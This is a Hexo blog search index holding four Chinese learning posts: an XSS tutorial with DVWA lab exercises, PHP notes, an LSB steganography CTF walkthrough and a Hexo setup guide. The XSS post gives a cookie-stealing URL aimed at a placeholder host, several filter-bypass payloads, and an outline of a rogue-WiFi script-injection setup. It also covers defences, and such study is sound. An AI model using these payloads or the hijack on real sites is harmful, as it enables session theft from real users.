<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>基于XSS的个人理解与基本练习</title>
      <link href="/2019/07/09/XSS/"/>
      <url>/2019/07/09/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="前端安全–XSS攻击"><a href="#前端安全–XSS攻击" class="headerlink" title="前端安全–XSS攻击"></a>前端安全–XSS攻击</h2><p>XSS漏洞是最广泛、作用最关键的web安全漏洞之一。在绝大多数网络攻击中都是把XSS作为漏洞链中的第一环，通过XSS，黑客可以得到的最直接利益就是拿到用户浏览器的cookie，从而变相盗取用户的账号密码。</p><p>这些常用的基本的攻击方式对我们学web安全的来说提升自己的同时，也能体验到XSS的乐趣。</p><p>在我们学习的时候需要理解XSS的原理以及特点</p><h3 id="关于XSS简述"><a href="#关于XSS简述" class="headerlink" title="关于XSS简述"></a>关于XSS简述</h3><p>跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这些漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。<br>攻击者可以使用户在浏览器中执行其预定义的恶意脚本，其导致的危害可想而知，如劫持用户会话，插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器对用户进行一定程度的破坏。</p><h3 id="XSS的原理"><a href="#XSS的原理" class="headerlink" title="XSS的原理"></a>XSS的原理</h3><p>学习什么都要记得先弄清楚原理。网站的搭建大部分都是上HTML+CSS然后嵌入javascript。标记语言HTML通过将一些字符特殊地对待来区别文本和标记，当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段javascript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p><h3 id="XSS的类型"><a href="#XSS的类型" class="headerlink" title="XSS的类型"></a>XSS的类型</h3><p>1.反射型 Reflected XSS<br>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。</p><p>2.基于DOM或本地的XSS攻击 DOM-Based型<br>基于DOM的XSS跨站脚本攻击是通过修改页面。DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。</p><p>3.存储型 Stored XSS<br>这种类型的XSS，危害比前一种大得多。比如一个攻击者在论坛的楼层中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。 </p><h2 id="XSS攻击举例"><a href="#XSS攻击举例" class="headerlink" title="XSS攻击举例"></a>XSS攻击举例</h2><p>1.反射型攻击<br>（1）正比如我们在京东或者淘宝搜索”笔记本”,搜不到书的时候显示提交的名称。（2）在搜索框搜索内容，填入“script alert(‘matebook’)/script”, 点击搜索。(由于个人编译器的问题省略了&lt;&gt;记得加上哦)（3）当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。我们都知道alert是一个弹出框口在web页面中。（4） 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<br><a href="http://www.jingdong.com/search?name=" target="_blank" rel="noopener">http://www.jingdong.com/search?name=</a> script document.location=’<a href="http://xxx/get?cookie=&#39;+document.cookie" target="_blank" rel="noopener">http://xxx/get?cookie=&#39;+document.cookie</a> script(由于个人编译器的问题省略了&lt;&gt;记得加上哦)<br>这个地址是伪造的 ，当然是无效的地址。这些地址的来源都是来自QQ邮箱中收到的垃圾邮件以及诈骗的链接中的。</p><p>2.存储型攻击<br>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。<br>正如</p><ol><li>发一篇文章，里面包含了恶意脚本<br>今天你做CTF了吗？你打CTF像胡一天 script alert(‘handsome boy’) /script (由于个人编译器的问题省略了&lt;&gt;记得加上哦)</li><li>后端没有对文章进行过滤，直接保存文章内容到数据库。</li><li>当其他看这篇文章的时候，包含的恶意脚本就会执行。<br>因为部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极又极大的可能出现这种情况。</li></ol><p>对于这种我们可以采用一些安全的防护措施<br>在开发的时候我们可以：</p><ol><li>首要是服务端要进行过滤，因为前端的校验可以被绕过。</li><li>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</li></ol><p>3.DOM-based or local XSS<br>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。<br>例子一：</p><ol><li>提供一个免费的wifi。</li><li>开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</li><li>之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</li><li>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</li><li>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</li></ol><p>这个例子来自大佬的博客，<a href="http://www.cnblogs.com/index-html/p/wifi_hijack_3.html#!comments" target="_blank" rel="noopener">http://www.cnblogs.com/index-html/p/wifi_hijack_3.html#!comments</a></p><p>这个是大佬进行的wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。 PS：对这个有兴趣的可以进行一下尝试，个人本人对这个挺感兴趣的。<br>例子二：</p><ol><li>还是提供一个免费wifi</li><li>在我们电脑上进行抓包</li><li>分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）。<br>这个是HTTP的窃取，本身跟网站的关系不是特别的大，只是数据被中间人获取了而已，因为HTTP是明文传输的，所以这个容易被别有心思的人所利用。注意防范。<br>开发安全措施：<br>上面提到了使用HTTP协议，HTTP协议相对于HTTPS协议，两者的差异性是在安全性上面的，所以就协议本身来说HTTPS协议的安全性高于HTTP，所以HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。</li></ol><h2 id="小小总结"><a href="#小小总结" class="headerlink" title="小小总结"></a>小小总结</h2><p>XSS攻击的特点就是：用一些办法在目标网站上执行非目标网站上原有的脚本</p><p>本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们在以后的开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。</p><h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><p>一、为了能够更好的了解这三种XSS攻击类型，在网上找到了一个在线的练习平台，平台名字叫安全龙，免费的实验室，在里面可以根据自己的需求进行练习。 </p><p>个人是在实验室中进入了DVWA靶场，当然你也可以从DVWA的官网上下载到电脑进行部署也可以。</p><p>首先我们可以先进行反射型XSS的应用</p><h3 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h3><p>进入到DVWA环境中，首先根据平台提示进入，之后选择安全等级。<br><img src="/2019/07/09/XSS/security.PNG" alt="Image">在这里是最低的，可以根据个人的需要进行调整</p><h4 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h4><p>我们进入到其中的反射型XSS（Reflected）中，在右下角有一个Viwe source 这个点击我们可以看到页面的源代码。之后进行尝试。<img src="/2019/07/09/XSS/Reflected1.PNG" alt="Image"></p><p>可以看到源码中没有任何的过滤，我们可以使用最常用的也是最基本的语句： script alert(/dxy/) /script （&lt;&gt;由于编辑器使用后默认为网页源代码这里给去掉了，各位进行试验的时候记得加上！）<br><img src="/2019/07/09/XSS/D1ROK.PNG" alt="Image"></p><h4 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h4><p>接下来我们选择一下等级。选择到中级Medium。<br>可以进行一下实验看中级下原来可以弹窗的初级语句有什么变化没有。输入后发现<img src="/2019/07/09/XSS/1.PNG" alt="Image"></p><p>可以看出没有任何的弹窗提示 ，只是出现了你刚才命令弹窗中的内容。<br>这时候我们同样的方式查看他的源代码。发现有一部分被过滤掉了。<br><img src="/2019/07/09/XSS/REZY.PNG" alt="Image"></p><p>在这里我们可以清晰的看到我们输入的字符中发现前面的&lt; script&gt;没有了，那就看看源代码中有什么过滤方式把&lt; script&gt;给过滤掉了.<br>str_replace(‘&lt; script&gt;’ ‘’)这里的str_replace（）函数以其他字符替换字符串中的一些字符，该函数区分大小写。使用 str_ireplace() 函数执行不区分大小写的搜索。</p><p>这里我们了解了该函数区分大小写。这样我们就可以使用大小写来进行绕过他的过滤从而达到我们想要的效果。<br>&lt; ScRipt&gt;alert(/sl/)&lt;/ script&gt;这样来实现结果。<br><img src="/2019/07/09/XSS/rezOK2.PNG" alt="Image"><br>PS：这个地方由于只是用了一个过滤，我们可以用其他的方法绕过去，继续进行。<br>例如双写绕过的写法PS：我又把&lt;&gt;加上了这样看起来方便，只是源代码的‘&lt;’后面有一个空格记得清除。</p><p>&lt; sc&lt; script&gt;ript&gt;alert(/sl/)&lt;/ script&gt;<br>使用这个双写绕过的写法看到str_replace() 函数把包裹在外层的 &lt; script&gt;给过滤掉了，但是我里面的语句并不会过滤掉，这样的话 我内部的语句同样来说可以继续执行下去。测试木的问题。成功。<br>进入下一个等级</p><h4 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h4><p> 进入高级节奏，输入之前的命令试试吧 我们输入之前初级的语句，尝试看看它过滤掉了什么。<br> <img src="/2019/07/09/XSS/G1.PNG" alt="Image"><br> 结果输入进去发现只剩下了个‘&gt;’ 。。。这样的情况，还是看看源代码比较好。<img src="/2019/07/09/XSS/G1YM.PNG" alt="Image"><br> 这里我看到了一个新的函数preg_replace（）函数  个人不太懂所以去搜索了一下，得到的是这样的结果。</p><p> preg_replace 函数执行一个正则表达式的搜索和替换。个人还是不太懂，于是我又去详细的了解了一下。<br> 例如:$str=”as2223adfsf0s4df0sdfsdf”;</p><p>echo preg_replace(“/0/“,””,$str);</p><p>这里的意思是去掉0字符，此时相当于 replace的功能, preg_replace(“/0/“,”A”,$str); 这样就是将0变成A的意思了<br>这样来看就比较明了了。 ps:匹配的字符串必须加/ / （可以看看第一个参数）</p><p>弄清楚了这个函数的意义，我们再看这个题 可以看到他把script给完全过滤掉了 这里有点小问题，它把script给过滤了，。。。我该用什么去弹窗。。。 除了script我们还可以用HTML标记语言来进行啊。我尝试了”onclick=”window.alert() 发现并没有成功，参考大佬的blog发现可以使用body进行弹窗输出。于是使用了</p><p>&lt; body onclick=alert(/sl/)&gt;来进行实验，结果成功弹出窗口。<br><img src="/2019/07/09/XSS/G1JG.PNG" alt="Image"></p><p>接下来。。尝试impossible</p><h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><p> 看到这个等级 impossible 不可绕过。这还没进行尝试他就给你说了难度。不过还是要去尝试一下。这里我选择了直接看源码。<br> <img src="/2019/07/09/XSS/im1.PNG" alt="Image"><br> 发现了htmlspecia1chars（）这个函数，不懂的我，再次求助了度娘。<br>发现它的作用:传入字符串$html,将$html中包含&lt;&gt;等HTML中预留的字符,转换成字符实体,返回转换后的字符串</p><p>定义和用法</p><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><pre><code>&amp; （和号）成为 &amp;&quot; （双引号）成为 &quot;&apos; （单引号）成为 &apos;&lt; （小于）成为 &lt;&gt; （大于）成为 &gt;</code></pre><p>PS：如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数</p><p>它的应用场景:</p><pre><code>a.想在HTML中直接显示源码(等同右击=&gt;查看源码效果),此时可以使用htmlspecialchars()对想输出的源码进行转义;b.文本过滤:在表单页,防止恶意注入,如在输入框中输入&lt;?php $sql=&quot;drop tabal user&quot;;mysql_query($sql); ?&gt;,此时使用htmlspecialchars()转义后,该脚本中的&lt;&gt;将会被转为字符实体,在php中不会执行.</code></pre><p>可以看出这个用来防注入字符是最好不过的了。</p><h3 id="2-储存型XSS"><a href="#2-储存型XSS" class="headerlink" title="2.储存型XSS"></a>2.储存型XSS</h3><p>这里我们试着通过练习来了解储存型的XSS攻击。依旧是从低向高进行。</p><h4 id="初级-1"><a href="#初级-1" class="headerlink" title="初级"></a>初级</h4><p> 我们同样开始进行尝试。输入语句。这时发现<img src="/2019/07/09/XSS/S1CS.PNG" alt="Image">它在页面上对字符的长度进行了一定的限制，这时候我们打开控制台，进行一个临时的编译，将输入字符串的长度进行更改。<br> <img src="/2019/07/09/XSS/S1JG.PNG" alt="Image"><br> 图中可以看到光标所选中的那一行。有这样maxlength=”30”这是我修改过的，修改之前的为10.修改后就可以看到能够输入进去了。<br> 输入之前的命令 发现没有啥改变 于是我又进行了一番摸索，发现之前的理解还是不够，最终摸索到了<img src="/2019/07/09/XSS/S1JG1.PNG" alt="Image"><br> 之后继续随便输入了name：test与 message：123123 之后出现了弹窗，之后的每一次输入都出现了刚才语句中间的内容。</p><p> 每当进入一个新的界面都会出现一个弹窗。</p><p> 小结：这时更清楚了储存型与反射型的不同的地方，储存型是持续，持久的进行弹窗。反射性不同，与之相反。</p><h4 id="中级-1"><a href="#中级-1" class="headerlink" title="中级"></a>中级</h4><p> 同样使用初级语句进行测试。<br> <img src="/2019/07/09/XSS/S2ZC.PNG" alt="Image"><br>可以看到我们输入的name是 alert(/sl/)。这时候我们查看一下源代码。<img src="/2019/07/09/XSS/S2CSYM.PNG" alt="Image"></p><p>可以看到它过滤掉的字符在这里<img src="/2019/07/09/XSS/S2ZYM1.PNG" alt="Image"><br>SCRIPT整个被过滤掉了，这时我们仍然可以使用之前在反射型XSS中的绕过语句。<br>双写绕过，以及大小写绕过。<br>&lt; body onclick=alert(/sl/)&gt;<br>&lt; ScRipt&gt;alert(/sl/)&lt;/ script&gt;<br>&lt; sc&lt; script&gt;ript&gt;alert(/sl/)&lt;/ script&gt;<br>这些语句均可以使用。<img src="/2019/07/09/XSS/S2ZJ.PNG" alt="Image"><br>这时候都出现了弹窗。我们已经成功的注入进去了。</p><h4 id="高级-1"><a href="#高级-1" class="headerlink" title="高级"></a>高级</h4><p>接下来我们步入高级的节奏。同样输入语句进行一个小小的注入测试。我们可以看到写进去的name <img src="/2019/07/09/XSS/SG1.PNG" alt="Image">被过滤的只剩一个”&gt;” 它的过滤类型应该跟之前反射型的高级模式是一样的 。我们查看一下源代码。<img src="/2019/07/09/XSS/SG1YM.PNG" alt="Image"><br>源码中的语句<img src="/2019/07/09/XSS/SG1J.PNG" alt="Image"><br>可以看到还是同样的preg_replace()函数依旧执行一个正则表达式的搜索和替换。<br>继续通过上次成功的语句&lt; body onclick=alert(/sl/)&gt;来进行实验。<br><img src="/2019/07/09/XSS/SG1JG1.PNG" alt="Image"><br>成功的可以看到弹窗 依次进行实验同样可以是持久性的弹窗。</p><h4 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h4><p> 有道理impossible 不可绕过的情况 我们一样直接进入，直接查看源码。<img src="/2019/07/09/XSS/im2.PNG" alt="Image"><br> 发现在输出那有一个htmlspecialchars() 函数，所以这个原理就和反射型XSS攻击一样.这里就简单的进行了对XSS熟悉的练习。通过这些练习，我们可以更深入的了解了XSS的不同类型的不同特点。</p><h2 id="总结与感悟"><a href="#总结与感悟" class="headerlink" title="总结与感悟"></a>总结与感悟</h2><h3 id="对字符转义的总结"><a href="#对字符转义的总结" class="headerlink" title="对字符转义的总结"></a>对字符转义的总结</h3><p> <img src="/2019/07/09/XSS/ZFZY.PNG" alt="Image"><br> 简单了解的判定<br> <img src="/2019/07/09/XSS/ZY.PNG" alt="Image"></p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p> 通过这次的XSS学习与了解，能够更深入的了解到XSS的原理，特征，以及不同的注入方式，注入语句。<br> 只有动手去实践一遍，去实际的操作，才能更好的了解，通过写blog记录下下来，能够帮助自己更好的找到问题，梳理清楚自己的问题与思路所在。总之，还是需要继续努力，继续向前。</p><p> 加油！前面的路还很遥远。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP个人学习记录</title>
      <link href="/2019/04/06/PHP/"/>
      <url>/2019/04/06/PHP/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博客记录了学习PHP中的个人理解与重要的知识点。能够更好的巩固自己所学习的知识。</p><h2 id="PHP简介"><a href="#PHP简介" class="headerlink" title="PHP简介"></a>PHP简介</h2><p>PHP 它的英文名称：Hypertext Preprocessor （学习过程中顺便记个单词） 它的中文名称：超文本预处理器。 PHP是一种开源脚本语言。主要适用于Web开发领域，PHP是一个应用范围很广的语言，特别是在网络程序开发方面。一般来说PHP大多在服务端运行，透过运行PHP的代码来产生网页提供浏览器读取，此外也可以用来开发命令行脚本程序和用户端的GUI应用程序。PHP可以在许多的不同种的服务器、操作系统、平台上运行，也可以和许多数据库系统结合。使用PHP不需要任何费用，官方组织PHP Group提供了完整的程序源代码，允许用户修改、编译、扩展来使用。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LSB隐写</title>
      <link href="/2019/04/05/LSB/"/>
      <url>/2019/04/05/LSB/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>平台上自己尝试着解了一些有关于图片隐写的问题，对于LSB隐写题目的一些学习与理解，以及个人的解题思路。</p><h2 id="LSB简介"><a href="#LSB简介" class="headerlink" title="LSB简介"></a>LSB简介</h2><p>LSB，称为：最低有效位，它的英文是Least Significant Bit 。我们知道图像像素一般是由RGB三原色（即红绿蓝）组成的，每一种颜色占用8位，0x00~0xFF，即一共有256种颜色，一共包含了256的3次方的颜色，颜色太多，而人的肉眼能区分的只有其中一小部分，这导致了当我们修改RGB颜色分量种最低的二进制位的时候，我们的肉眼是区分不出来的。LSB加密是信息隐藏中最基本的方法。古人的藏头诗也算是一种隐写。</p><p><img src="/2019/04/05/LSB/jian.png" alt="Image"></p><h2 id="对最低有效位的意思解析"><a href="#对最低有效位的意思解析" class="headerlink" title="对最低有效位的意思解析"></a>对最低有效位的意思解析</h2><p>png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。<br>png图片中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。<br><img src="/2019/04/05/LSB/lj.png" alt="Image"><br>十进制的235表示的是绿色，我们修改了在二进制中的最低位，但是颜色看起来依旧没有变化。我们就可以修改最低位中的信息，实现信息的隐写。我修改最低有效位的信息的算法就叫做lsb加密算法，提取最低有效位信息的算法叫做lsb解密算法。<br><img src="/2019/04/05/LSB/lj01.png" alt="Image"><br><img src="/2019/04/05/LSB/lj02.png" alt="Image"></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>解题必然会有工具这里， 在这里使用一款功能很强大的lsb隐写分析工具—StegSolve图片通道查看器。使用这个工具记得首先安装JDK配置JAVA环境，然后再使用StegSolve。<br>下面是我使用的JDK以及配置好后的StegSolve图标。<br><img src="/2019/04/05/LSB/java.png" alt="Inage"></p><h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p>之后看题目用stegsolve打开看到这张图片。<br><img src="/2019/04/05/LSB/java01.png" alt="Image"><br>使用stegsolve打开图片，按右方向键查看各通道显示的图像。一般有些题目会在某一个图像通道中直接显示出flag，但是显然这题不行，看来还需要绕些弯，要获取最低位的图片信息。<br>打开后使用Data Extract: 数据抽取，图片中隐藏数据的抽取。可以看到<img src="/2019/04/05/LSB/java05.png" alt="Image"><br>这时 看到这 突然会不知道如何去选择，或者乱选一气，当然这绝对出不来。那么我们应该如何去点。回到最开始的图片中<img src="/2019/04/05/LSB/java01.png" alt="Image">向右边一直翻动会发现<br>alpha plane7-0全是一个颜色没有任何变化，之后继续翻动会发现</p><p><img src="/2019/04/05/LSB/java02.png" alt="Image"></p><p>Red plane0这里左上角好像有些字符 继续翻动</p><p><img src="/2019/04/05/LSB/java03.png" alt="Image"><br>green plane0 左上角也同样有字符一样继续翻动</p><p><img src="/2019/04/05/LSB/java04.png" alt="Image"><br>blue  plane0左上角也有。这时候回到图片分析里  看到bit planes看到里面有通道选择 对应上面的三个0通道选择<img src="/2019/04/05/LSB/java05.png" alt="Image"><br>同时bit order 选择LSB一栏点击预览 可以得到<img src="/2019/04/05/LSB/java06.png" alt="Image">这时候看到上面有编码出现向上拉动，会发现flag<img src="/2019/04/05/LSB/java05.png" alt="Image"><br>这里我们就拿到了这道题的flag 就是 have a good time！</p><p>同样 第二道LSB 跟上述一样选择好通道一样可解出来<br><img src="/2019/04/05/LSB/TM01.png" alt="Image"><br>具体操作更上述一样就不在一一举出了。</p><p>这是我这个小白的解题思路，如有出错还请大佬轻喷。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用Hexo搭建个人博客+主题更换</title>
      <link href="/2019/03/16/hello-world/"/>
      <url>/2019/03/16/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于个人博客的搭建过程，个人在这里面踩了很多的坑，初次搭建的不算成功，还好有团队的教学与学长的经验相助，在努力下搭建了我的个人博客。在此总结我在搭建的一些过程。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>本次过程只适用于windows的用户。用于个人学习记录。  </p><h3 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h3><p>一、Nodejs的安装</p><p>二、Git安装</p><p>三、GitHub创建个人仓库</p><p>四、配置SSH key</p><p>五、Hexo安装</p><p>六、发布网站</p><p>七、更改主题</p><h3 id="一、Nodejs的安装"><a href="#一、Nodejs的安装" class="headerlink" title="一、Nodejs的安装"></a>一、Nodejs的安装</h3><p>Hexo基于Node.js的，搭建博客网站首先需要安装Node.js环境。<br><img src="/2019/03/16/hello-world/nodejs.png" alt="Image text"></p><p>下载地址：http:\nodejs.cn\download<br>测试安装：命令行使用node -v 、npm -v，查看显示版本号即成功。<br>打开cmd命令行，成功界面如下<br><img src="/2019/03/16/hello-world/success.png" alt="Image text"></p><h3 id="二、Git安装"><a href="#二、Git安装" class="headerlink" title="二、Git安装"></a>二、Git安装</h3><p>网站在本地搭建好了，需要使用Git同步到GitHub上。</p><p>首先访问https:\git-scm.com\ 下载完毕后进入安装界面进行安装。<br><img src="/2019/03/16/hello-world/git01.png" alt="Image"></p><p><img src="/2019/03/16/hello-world/git02.png" alt="Image"></p><p>正常安装后使用git –version的命令来测试git是否安装成功。</p><p><img src="/2019/03/16/hello-world/git03.png" alt="Image"></p><p>到这里git就已经安装成功了！</p><h3 id="三、GitHub创建个人仓库"><a href="#三、GitHub创建个人仓库" class="headerlink" title="三、GitHub创建个人仓库"></a>三、GitHub创建个人仓库</h3><p>1.首先登录https:\github.com 进行账户注册和新建项目。此处由于之前创建过所以无法创建。在这里需要注意目必须要遵守格式：你的账户名.github.io。并且需要勾选Initialize this repository with a README。</p><p><img src="/2019/03/16/hello-world/github01.png" alt="Image"></p><p>在建好的项目右侧有个settings按钮，点击它，向下拉到GitHub Pages，你会看到那边有个网址，访问它，你会现该项目已经被部署到网络上，能够通过外网来访问它。如下图所示：</p><p><img src="/2019/03/16/hello-world/github02.png" alt="Image"></p><h3 id="四、配置SSH-key"><a href="#四、配置SSH-key" class="headerlink" title="四、配置SSH key"></a>四、配置SSH key</h3><p>为了要拥有你的github权限，但是直接使用用户名和密码太不安全了，所以我们使用ssh key来解决本地和服务器的连接问题。<br><img src="/2019/03/16/hello-world/ssh01.png" alt="Image">使用$ cd ~. ssh #检查本机已存在的ssh密钥。<br><img src="/2019/03/16/hello-world/ssh02.png" alt="Image"></p><p>如果提示：No such file or directory 说明你是第一次使用git。然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：<img src="/2019/03/16/hello-world/ssh03.png" alt="Image"></p><p>之后进行测试是否成功！<img src="/2019/03/16/hello-world/ssh04.png" alt="Image"><br>如果提示Are you sure you want to continue connecting (yes\no)?，输入yes，然后会看到：<img src="/2019/03/16/hello-world/ssh05.png" alt="Image"><br>看到这个信息说明SSH已配置成功！</p><h3 id="五、Hexo安装"><a href="#五、Hexo安装" class="headerlink" title="五、Hexo安装"></a>五、Hexo安装</h3><p>1.首先在自己认为合适的地方创个文件夹，个人是在D盘建了一个hexo然后再建立了blog文件夹。也可以直接建立一个blog文件然后使用DOS命令进入到该文件夹里面。然后输入输入npm install hexo -g，开始安装Hexo.<br>![Image] (hello-world\hexo01.png)<br>完成后，继续输入命令 cnpm install -g hexo-cli<br>![Image]     (hello-world\hexo02.png)</p><p>等待完成，再输入命令 cnpm install hexo –save<br><img src="/2019/03/16/hello-world/hexo03.png" alt="Image"></p><p>至此Hexo安装完成，使用查看版本命令 hexo -v 检查是否正常安装。<img src="/2019/03/16/hello-world/hexo04.png" alt="Image"></p><h3 id="六、发布网站"><a href="#六、发布网站" class="headerlink" title="六、发布网站"></a>六、发布网站</h3><p>1、本地启动<br>创建一个新文件夹（我的是在E盘创建的Blog），进入该文件夹，右键Git Bash Here，输入 hexo init 命令。<br>接下来输入 hexo s -g 命令启动，启动后浏览器访问localhost:4000查看博客效果。</p><p>2、部署到Github<br>本地成功后下面就要部署到Git了，打开_config.yml进行配置，如下图，复制你的仓库地址给repo参数<br><img src="/2019/03/16/hello-world/blog01.png" alt="Image"><br>在Git命令窗口输入 npm install hexo-deployer-git –save 安装hexo-deployer-git自动部署发布工具，等待安装完成，输入 （hexo clean）   （hexo g）   （hexo d） 命令发布到Github，这里注意第一次发布的话会需要输入你的Github账号跟密码，等待出现下图的信息就说明发布成功了，在浏览器输入yourname.github.io就可以看到你的博客了。<img src="/2019/03/16/hello-world/blog02.png" alt="Image"></p><h3 id="七、更改主题"><a href="#七、更改主题" class="headerlink" title="七、更改主题"></a>七、更改主题</h3><p>部署完毕后，可以根据自己的喜好更改自己的主题在hexo的官网中有主题选项然后进行配置更改找到自己喜欢的网站主题。完成配置就好了。</p><h3 id="对于上传图片的问题解决"><a href="#对于上传图片的问题解决" class="headerlink" title="对于上传图片的问题解决"></a>对于上传图片的问题解决</h3><p> 前一段搭建好的个人博客 图片怎么传也传不上去，把图片放在github的库中也没有操作好 ，甚至找了一个破解版的MarkdownPad 2 插入图片也没有成功，对此  差点自闭。 后来在学长的指导下得出了如何简单的上传图片。放下如下</p><p> 1、cd到博客根目录下 查看_config.yml文件<br>    查找 post_asset_folder<br>    字段确定post_asset_folder<br>    设置为true -&gt; post_asset_folder:true</p><p>2、当你设置 post_asset_folder  参数后，在建立文件时，Hexo 会自动建立一个与文章同名的文件夹，你可以把与该文章相关的所有资源都放到此文件夹内，这样就可以更方便的使用资源。</p><p>3、到博客的根目录下执行 npm install <a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">https://github.com/CodeFalling/hexo-asset-image</a> –save 命令来进行插件的安装。</p><p>4、然后创建一文章 hexo new “test” 然后查看博客的 ../source/_posts 目录下的文件，会看到存在一个test 文件夹 和 test.md 文件</p><p>5、将需要显示在test.md文件中的图片放到上面命令生成的test文件夹中<br>    在test.md文件中使用命令显示文件，其中中括号的内容会是你在md文件中图片的名字，小括号中的地址的格式为 文件夹名/图片名，例如 test/test.png</p><p>在此终于解决了图片上传的问题，由衷感谢学长的帮助。<br>个人博客，希望能够帮助到一些人，小白第一次发博，还请大佬轻喷。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
